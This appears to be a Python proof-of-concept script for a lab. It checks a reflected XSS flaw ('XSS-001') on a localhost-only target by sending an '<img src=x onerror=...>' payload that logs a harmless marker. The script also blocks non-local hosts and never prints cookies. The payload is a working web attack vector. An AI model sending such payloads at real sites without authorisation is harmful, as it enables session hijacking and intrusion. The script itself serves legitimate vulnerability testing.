#!/usr/bin/env python3
# XSS-001 reflected-XSS verification draft. Harmless console marker only.
# Scope: localhost / 127.0.0.1 / ::1 only. Redirects are never followed. Cookie contents are never printed.
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}
PAYLOAD = "<img src=x onerror=console.log(/LLM_LAB_XSS/.source)>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def assert_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('refuse non-http(s) scheme: %r' % parts.scheme)
    if (parts.hostname or '') not in ALLOWED_HOSTS:
        raise SystemExit('refuse non-local host: %r' % parts.hostname)


def read_cookie(path):
    if not path:
        return None
    with open(path, 'r', encoding='utf-8') as fh:
        value = fh.read().strip()
    if not value:
        raise SystemExit('cookie file is empty')
    return value


def main():
    parser = argparse.ArgumentParser(description='XSS-001 local verification draft')
    parser.add_argument('--base-url', default='http://127.0.0.1')
    parser.add_argument('--path', required=True,
                        help='page path that includes the XSS-001 fragment, e.g. /your/target/page.php')
    parser.add_argument('--param', default='name')
    parser.add_argument('--cookie-file', default=None,
                        help='local file holding the PHPSESSID cookie value; never printed')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    target = args.base_url.rstrip('/') + '/' + args.path.lstrip('/')
    assert_local(target)
    query = urllib.parse.urlencode({args.param: PAYLOAD})
    url = target + ('&' if urllib.parse.urlsplit(target).query else '?') + query
    assert_local(url)

    headers = {'User-Agent': 'llm-lab-xss001-draft/1.0'}
    cookie = read_cookie(args.cookie_file)
    if cookie:
        headers['Cookie'] = cookie

    request = urllib.request.Request(url, headers=headers, method='GET')
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=args.timeout) as response:
            status = getattr(response, 'status', None) or response.getcode()
            body = response.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as exc:
        print('HTTP error %s %s' % (exc.code, exc.reason))
        print('note: 301/302 here usually means the session is not authenticated for this path')
        return 2
    except urllib.error.URLError as exc:
        print('connection or protocol error: %s' % exc.reason)
        return 3

    print('request URL: %s' % url)
    print('HTTP status: %s' % status)
    marker_at = body.find('LLM_LAB_XSS')
    if marker_at < 0:
        print('marker absent from body: check authentication, page path, security level and parameter name')
        return 4
    start = max(0, marker_at - 200)
    end = min(len(body), marker_at + 200)
    print('--- response context around marker ---')
    print(body[start:end])
    print('--- end context ---')
    if '<img src=x onerror=' in body:
        print('OBSERVED: payload reflected verbatim and the tag is not HTML-encoded')
        print('browser execution still requires manual observation, see steps')
        return 0
    print('OBSERVED: marker present but the tag looks encoded; do not claim execution')
    return 5


if __name__ == '__main__':
    sys.exit(main())
